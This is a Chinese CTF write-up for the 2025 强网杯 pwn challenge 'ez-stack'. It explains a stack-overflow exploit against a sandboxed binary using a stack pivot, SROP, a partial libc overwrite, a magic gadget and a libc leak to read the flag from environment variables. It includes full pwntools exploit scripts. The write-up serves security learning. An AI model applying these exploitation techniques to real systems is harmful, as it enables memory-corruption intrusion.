---
title: 【微信】web选手入门pwn(40)——ez-stack(2025强网杯)
source: https://mp.weixin.qq.com/s/jHFgTUOc9HJwHzdjFMyNVg
source_host: mp.weixin.qq.com
clip_date: 2026-10-09T17:07:54+08:00
trace_id: 0bdbfda7-6f49-4d86-bceb-f9814643b995
content_hash: 70ebdb96e36b4228ccea12c4b25a73e601d39caf1bb63353f9e20293aef0acb8
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 无 open 的沙箱栈溢出题：靠栈迁移 + SROP + magic gadget 把普通 syscall 升级成 syscall;ret，泄露 libc 与栈上环境变量拿到 flag。
ai_summary_style: key-points
images_status:
  total: 31
  succeeded: 31
  failed_urls: []
notion_page_id: 3f475244-d011-814c-befe-fd84959c1272
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 无 open 的沙箱栈溢出题：靠栈迁移 + SROP + magic gadget 把普通 syscall 升级成 syscall;ret，泄露 libc 与栈上环境变量拿到 flag。
> 
> - **环境与题目条件：** libc 2.35，No PIE / No canary 的直白栈溢出；沙箱白名单只有 read/write/rt_sigreturn 等，没有 open，但 flag 除 /flag.txt 外还写在环境变量里（在栈上），所以最终目标是 write 读栈。
> - **卡点与突破：** 程序既无 write@plt 也无常用 pop;ret，必须先泄露 libc；由于拿不到栈地址，转而利用 No PIE 把栈迁移到 bss(0x404800)，但 bss 为空需先用 re_read(0x4015FB) 写一次再返 start 才能落脚。
> - **核心技巧：** 篡改 __libc_start_call_main+162 处的 mov eax,edx;syscall（需 1/16 撞概率），借 read 后 edx=len(payload) 间接控制 rax，从而调用系统调用号 0xf 的 rt_sigreturn，用 SigreturnFrame 一次性控制全部寄存器。
> - **矛盾与升级：** mov eax,edx 使 rdx 兼作 write 的 size 只能泄露 1 字节；改为直接跳到 syscall（跳 0x7db4）后 rdx 可控为 8，再用 magic gadget（add dword ptr [rbp-0x3d], ebx）把该 syscall 改写成 syscall;ret，成功泄露 libc。
> - **取 flag：** 依次 write(environ,8) 得环境变量栈地址，再 write 该地址取 flag 指针，最后 write(stack_flag, 0x200) 读出 flag；ASLR 下 1/16 概率可封装成循环重试。

**珂技知识分享** *2026年10月9日 16:47*

一点也不ez的ez-stack。

https://github.com/CTF-Archives/2025-qwbs9-quals/releases/download/attachments/ez-stack_bbd95e84e69dcd047d17a0f8aff94571.zip

这题自带libc 2.35，我是用如下环境做的，libc有点不一样，但思路应该没错。

```apache
sudo docker run -it --rm -v $PWD:/pwn roderickchan/debug_pwn_env:22.04-2.35-0ubuntu3.8-20240601 /bin/bash
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1202d8aac3d9b31f.png)

## 题目条件与沙箱限制

非常直接的栈溢出，setup_sandbox()是沙箱，白名单只有read/write/rt_sigreturn等。没有open意味着我们无法读文件，根据自带的Dockerfile可以知道flag除了写在/flag.txt中，还在写在了环境变量中(web题常见套路)。而环境变量是会在栈上的，因此这题最终就是用write读栈。也就是读这块区域。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a946b654660d5d53.png)

这题No PIE/No canary，意味着我们可以直接用栈溢出+plt走ROP链，但是没有write@plt，同时也没有常用pop_ret链。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dc5f0ef443abf492.png)

那么必须先泄露libc，用libc上的ROP。如何泄露呢？栈上肯定有libc，但栈地址我们同样不知道，要泄露libc就必须泄露栈。

## 栈迁移到 bss 的思路

这题No PIE说明有bss，那么常用的栈迁移到bss不就可以省略泄露栈的步骤吗？

```javascript
from pwn import *
 
context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','splitw','-h']
 
p = process("./chall")
gdb.attach(p, "b *0x40160C")
 
elf = ELF('./chall')
libc = ELF("./libc.so.6")
rop = ROP(libc)
 
bss = 0x404000 + 0x800
cnt = 0x40404C
leave = 0x40161E
ret = 0x40161F
 
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(leave)
p.send(payload)
 
p.interactive()
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a088a8008e9001c1.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d7ee70bdbba184eb.png)

这里注意p64(bss)是rbp，rbp前面必须是一个可写的地址，默认是cnt，因为存在v6 = &cnt;\*v6 = v3;这个代码的原因。

不过迁移完，由于0x404800上是空的，所以会直接报错。传统栈迁移bss是可以提前向bss上写ROP，这里不行。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3696c7fb5fe276b9.png)

那么我们可以先进行一次read，再返回到start上，就能迁移成功。

```apache
re_read = 0x4015FB
start = 0x401170 
bss = 0x404000 + 0x800
cnt = 0x40404C
leave = 0x40161E
ret = 0x40161F
 
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)
 
payload = b'A'*0x18 + p64(cnt) + p64(0) + p64(start)
p.send(payload)
```

此时bss上就有了libc，不过可惜的是bss上并没有env，env还是在原来的栈上。

此外，值得注意的是，这个re_read处的汇编很有用，它除了用于栈迁移到p64(bss)之外，还会在p64(bss-0x20)处写下一次send。

也就是这段

```nginx
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)
p.send(b'B'*0x8)
```

等同于，将rbp指向bss，且向bss-0x20处写下'B'\*0x8。

此时栈上容易找到两个libc

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/69aae747af0d2f59.png)

往rsp低位找，还能找到几个。

```apache
telescope 0x404640 30
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dfde31b15ba62939.png)

我们先只考虑rsp高位的两个，其中0x404708 —▸ 0x7ffff7d97d90是ret的地址，在以前的一道PIE题中 [web选手入门pwn(19) ——2个字节](https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247487030&idx=1&sn=34a51e43ca37152638f14c124292a174&scene=21#wechat_redirect) ，曾经修改过它末尾的0x90来达到想要的目的。而且最多可以修改0x7d90，因为只有7是随机的，可以撞1/16的概率。最理想的情况是直接修改到one_gadget，但这题显然不行。

查看0x7ffff7d97d90汇编，其中最显眼的就是系统调用——mov eax,edx;syscall。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6db1271501a8a54c.png)

回顾下x64 syscall用法如下，以write为例。

```ini
rax=系统调用号，write是1
rdi=第一个参数
rsi=第二个参数
rdx=第三个参数
```

这个系统调用前面有mov eax,edx，只要控制了rdx就能控制rax，执行完会走上方重新走一遍系统调用。

当然更理想的是syscall;ret，

```apache
ROPgadget --binary ./libc.so.6 --opcode 0f05c3
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/81f66a13a10601ac.png)

不过可惜的是它们全部远离bss上的libc地址。

如何利用仅有的mov eax,edx;syscall呢？我们根本没有pop;ret，不过这里edx还是勉强能够控制的，这就要回到read(0, buf, 0x100uLL)的栈溢出后的汇编。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/28f58bdba085ef65.png)

可以看到为了将read成功写入后返回的实际字节数写在cnt上，这里刚好用了edx进行过渡，也就是edx=len(payload)，eax=0

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0a6c740415229f2a.png)

控制了edx，eax=0，再经过mov eax,edx;syscall，就可以调用想要的函数了。

测试一下。

```apache
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)
 
payload = b'A'*0x18 + p64(cnt) + p64(0) + p64(start)
p.send(payload)
 
pause()
payload = b'A'*0x18 + p64(cnt) + p64(0) + b"\xb2"
p.send(payload)
```

注意这里因为没有提示词，不能用sendafter()，必须要用pause()来控制payload的输入时机，需要运行到read()时从gdb切换到python那边按回车输入。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3a26a251c51893a2.png)

可以看到成功进入syscall，且经过mov eax,edx控制rax=0x29，也就是len(payload)的长度。

## 用 SROP 控制全部寄存器

如果我们能完全控制rax，这里改成read/write肯定是没意义的，因为控制不了其他寄存器。所以正确答案是rt_sigreturn，系统调用号0xf，它所衍生的SROP技术刚好适用这种几乎不能控制寄存器的情况，这也是为什么它在白名单内。

它的用法也很简单，在call rt_sigreturn的时候会从栈上取SigreturnFrame结构体(ucontext_t)，然后用对应属性给所有寄存器赋值。

```ini
f=SigreturnFrame()
f.rax = 0
f.rdi = 0
f.rsi = 0
f.rdx = 0
f.rsp = 0x404800
f.rip = ret
f.rbp = bss
payload = padding + p64(rt_sigreturn) + bytes(f)
```

这样我们就可以从只能控制eax到控制了全部寄存器，再将rip=syscall，不就能write了吗？

但这里又带来一个问题，SigreturnFrame结构体比较大，而且必须放在p64(rt_sigreturn)后面，也就是p64(syscall)后面。而我们只能通过修改0x7ffff7d97d90后面的0x90来跳到syscall，也就是说payload只能是padding + "\\xb2"，后面不能跟任何东西，否则就毁坏libc地址了，这要怎么解决呢？

同理，由于rax=len(payload)=0x29，这也导致rax也是无法控制的，要如何解决呢？

答案是放弃对0x7ffff7d97d90的篡改，分两步来篡改高位的0x7ffff7d97e40。

```apache
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)
 
payload = b'A'*0x18 + p64(cnt) + p64(0) + p64(start)
p.send(payload)
 
pause()
#0x4046e0
payload = b'A'*0x18 + p64(cnt) + p64(0x4047b0+0x20) + p64(re_read) + b'A'*0x88
payload += p64(cnt) + p64(bss) + p16(0x7db2) #0x4047a8 —▸ 0x7ffff7d97db2 (__libc_start_call_main+162) ◂— mov eax, edx
p.send(payload)
```

这是第一步，目的是篡改0x7ffff7d97e40成0x7ffff7d97db2，需要拼1/16的概率。以及在它的低位提前布局cnt/rbp，用来做re_read的栈。同时控制rbp=0x4047b0+0x20，也就是下次read会从0x4047b0开始写，刚好避免修改0x7ffff7d9。

```apache
pause()
f=SigreturnFrame()
f['uc_stack.ss_flags'] = cnt
f['uc_stack.ss_size'] = 0x404780+0x20
f.r8 = re_read
f.rsp = 0x4047a8 #syscall
f.rax = 0        #mov eax, edx; rax=1 write syscall
f.rdi = 1        #write fd=1
f.rsi = 0x4047a8 #write_addr
f.rdx = 1        #write size and mov eax, edx
f.rip = ret
f.rbp = bss
payload = bytes(f)
p.send(payload)
```

这是第二次写入，uc_stack.ss_flags/uc_stack.ss_size/r8这些对应的是正常payload里的cnt/rbp/ret，后面才是控制寄存器。

且这里必须安排rbp在0x4047a8(0x7ffff7d97db2)的低位0x404780，以便下次栈溢出ret到0x7ffff7d97db2。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e5d7b3f790ec2805.png)

这样就完成了padding + p64(rt_sigreturn) + bytes(f)的布局。最后控制rax=len(payload)=0xf。

```javascript
pause()
payload = b'B'*0xf
p.send(payload)
```

成功进入rt_sigreturn

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a655008facd55ed0.png)

设置好所有的栈，因为rip=ret，rsp=0x4047a8，因此继续走mov eax, edx;syscall。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4fd3560d0d99e30d.png)

因为我们设置的f.rax = 0，f.rdx = 1，经过mov eax, edx，也就是rax=1，rdx=1。最终执行write(1,0x4047a8,1)。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c91556eb5aa98cf3.png)

结果只能打印0x4047a8上的1字节，显然不符合我们的预期。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/be35fdaccd798fe8.png)

这是因为我们必须经过mov eax, edx，write的系统调用号是1，那么rdx必须是1。而rdx同时又是write的第三个参数size，导致最多只能打印1个字节。这是不可调和的矛盾。

不过请注意syscall下方还存在跳到上方的jmp。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9a7aaa866678c7ed.png)

## 改写 syscall 泄露 libc

那么我们可以这样布局。

```apache
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)
 
payload = b'A'*0x18 + p64(cnt) + p64(0) + p64(start)
p.send(payload)
 
pause()
#0x4046e0
payload = b'A'*0x18 + p64(cnt) + p64(0x4047b0+0x20) + p64(re_read) + b'A'*0x88
payload += p64(cnt) + p64(bss) + p16(0x7db4) #0x4047a8 —▸ 0x7ffff7d97db4 <__libc_start_call_main+164>: syscall
p.send(payload)
 
pause()
f=SigreturnFrame()
f['uc_stack.ss_flags'] = cnt
f['uc_stack.ss_size'] = 0x404780+0x20
f.r8 = re_read
f.rax = 1        #write syscall
f.rdi = 1        #write fd=1
f.rsi = 0x4047a8 #write_addr
f.rdx = 8        #write size
f.rsp = 0x4047a8 #syscall
f.rip = ret
f.rbp = bss
payload = bytes(f)
p.send(payload)
 
pause()
payload = b'B'*0xf
p.send(payload)
 
pause()
payload = b'C'*0x8
p.send(payload)
```

区别是抛弃了mov eax, edx，直接syscall

```apache
0x4047a8 —▸ 0x7ffff7d97db4 <__libc_start_call_main+164>: syscall
```

这样rdx=0xf，rax=0，会调用read，然后输入'C'\*0x8。效果如下。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/280dc7a413b04576.png)

然后read返回0x8也就是rax=0x8，jmp回上方经历mov eax, edx，rax=rdx=0xf。

也能成功进入rt_sigreturn。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fa9b5dccf34c5a00.png)

然后由于没有mov eax, edx，rdx就能成功控制为8了，执行write(1,0x4047a8,8)。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/59d7969e2a73bdd4.png)

后续因为继续循环mov eax, edx，rax被控制为8，系统调用lseek而报错。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/be3f90a05a0708ae.png)

两者的区别可以见如下图

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7a7a512fd596c289.png)

此时rax=rdx，是SigreturnFrame()控制的，我们可以更改成0xf或者0x9之类的避免报错，但最终都会无限循环下去，无法让rip重新回到text区。这正是0x7ffff7d97db4这个系统调用的缺陷。

因此我们需要先将它升级为一个更好用的syscall;ret。

这就需要用到常跟csu搭配的magic gadget，它可以在\__do_global_dtors_aux中偏移出来。

那么rt_sigreturn之后我们rip=magic，然后通过控制rbx和rbp，将0x4047a8地址上的0x7ffff7d97db4修改成一个syscall;ret。

然后rsp=0x4047a8，再在0x4047a8下方写一个re_read，就能write完再走回re_read了。

```nginx
magic = 0x40123C #add DWORD PTR [rbp-0x3d],ebx
 
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)
 
payload = b'A'*0x18 + p64(cnt) + p64(0) + p64(start)
p.send(payload)
 
pause()
#0x4046e0
payload = b'A'*0x18 + p64(cnt) + p64(0x4047b0+0x20) + p64(re_read) + b'A'*0x88
payload += p64(cnt) + p64(bss) + p16(0x7db4) #0x4047a8 —▸ 0x7ffff7d97db4 <__libc_start_call_main+164>: syscall
p.send(payload)
 
pause()
f=SigreturnFrame()
f['uc_flags'] = re_read
f['uc_stack.ss_flags'] = cnt
f['uc_stack.ss_size'] = 0x404780+0x20
f.r8 = re_read
 
f.rax = 1        #write syscall
f.rdi = 1        #write fd=1
f.rsi = 0x4047a8 #write_addr
f.rdx = 0x8      #write size
 
f.rbx = 0x91316-(0x7ffff7d97db4-0x7ffff7d6e000) #0x91316 libc : syscall;ret
f.rsp = 0x4047a8 #syscall;ret
f.rip = magic
f.rbp = 0x4047a8+0x3d
payload = bytes(f)
p.send(payload)
 
pause()
payload = b'B'*0xf
p.send(payload)
 
pause()
payload = b'C'*0x8
p.send(payload)
```

我们来拆解步骤，第一次系统调用还是read

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e49663fbcdb744dc.png)

第二次经过mov eax, edx，因此rax=0xf，系统调用rt_sigreturn。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3853bc7db649fcb1.png)

给所有寄存器赋值，控制rip=magic

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/12dbcd7481bff880.png)

经过add dword ptr \[rbp - 0x3d\], ebx，0x4047a8上的syscall升级为syscall;ret。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/56e12ea8b56980c0.png)

系统调用write，泄露libc，栈上紧接着是我们提前布置了f\['uc_flags'\] = re_read，因此后续可以继续进行栈溢出。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1e3e95beb6ea12eb.png)

## 读环境变量取 flag

泄露libc之后就是常规ROP链了，libc.sym\['environ'\]上存储着各个env的栈地址，因此先打印stack_environ=write(1,libc.sym\['environ'\],8)，再打印stack_flag=write(1,stack_environ,8)，最后打印write(1,stack_flag,0x200)即可获取全部环境遍历。最后要注意下由于rsp已经比较偏了，我们设置rbp的时候要根据rsp来设置。

完整exp如下

```perl
from pwn import *
 
context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','splitw','-h']

p = process("./chall")
#gdb.attach(p, "b *0x40160C\nc\nc")

elf = ELF('./chall')
libc = ELF("./libc.so.6")
rop = ROP(libc)

re_read = 0x4015FB
start = 0x401170 
bss = 0x404000 + 0x800
cnt = 0x40404C
leave = 0x40161E
ret = 0x40161F
magic = 0x40123C #add DWORD PTR [rbp-0x3d],ebx

payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(re_read)
p.send(payload)

payload = b'A'*0x18 + p64(cnt) + p64(0) + p64(start)
p.send(payload)

pause()
#0x4046e0
payload = b'A'*0x18 + p64(cnt) + p64(0x4047b0+0x20) + p64(re_read) + b'A'*0x88
payload += p64(cnt) + p64(bss) + p16(0x7db4) #0x4047a8 —▸ 0x7ffff7d97db4 <__libc_start_call_main+164>: syscall
p.send(payload)

pause()

f=SigreturnFrame()
f['uc_flags'] = re_read
f['uc_stack.ss_flags'] = cnt
f['uc_stack.ss_size'] = 0x404780+0x20
f.r8 = re_read

f.rax = 1        #write syscall
f.rdi = 1        #write fd=1
f.rsi = 0x4047a8 #write_addr
f.rdx = 0x8      #write size

f.rbx = 0x91316-(0x7ffff7d97db4-0x7ffff7d6e000) #0x91316 libc : syscall;ret
f.rsp = 0x4047a8 #syscall;ret
f.rip = magic
f.rbp = 0x4047a8+0x3d

payload = bytes(f)
p.send(payload)

pause()
payload = b'B'*0xf
p.send(payload)

pause()
payload = b'C'*0x8
p.send(payload)

libc_N = u64(p.recvuntil("\x7f")[-6:]+b"\x00\x00")
print(hex(libc_N))
libc_base = libc_N-0x91316
print(hex(libc_base))

environ = libc.sym['environ'] + libc_base
write = libc.sym['write'] + libc_base
libc_pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc_base
libc_pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0] + libc_base
libc_pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0] + libc_base

pause()
payload = b'A'*0x18 + p64(cnt) + p64(0x404835+0x20) + p64(libc_pop_rdi) + p64(1) + p64(libc_pop_rsi) + p64(environ) + p64(libc_pop_rdx) + p64(8) + p64(0) + p64(write) + p64(re_read)
p.send(payload)
stack_environ = u64(p.recvuntil("\x7f")[-6:]+b"\x00\x00")
print(hex(stack_environ))

pause()
payload = b'A'*0x18 + p64(cnt) + p64(0x4048a5+0x20) + p64(libc_pop_rdi) + p64(1) + p64(libc_pop_rsi) + p64(stack_environ) + p64(libc_pop_rdx) + p64(8) + p64(0) + p64(write) + p64(re_read)
p.send(payload)
stack_flag = u64(p.recvuntil("\x7f")[-6:]+b"\x00\x00")
print(hex(stack_flag))

pause()
payload = b'A'*0x18 + p64(cnt) + p64(bss) + p64(libc_pop_rdi) + p64(1) + p64(libc_pop_rsi) + p64(stack_flag) + p64(libc_pop_rdx) + p64(0x200) + p64(0) + p64(write)
p.send(payload)
 
p.interactive()
```

开启ALSR要撞1/16的概率，也可以封装成一个函数做循环try，实际效果如下。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7b4c1f892cc04b33.png)

web选手入门pwn · 目录
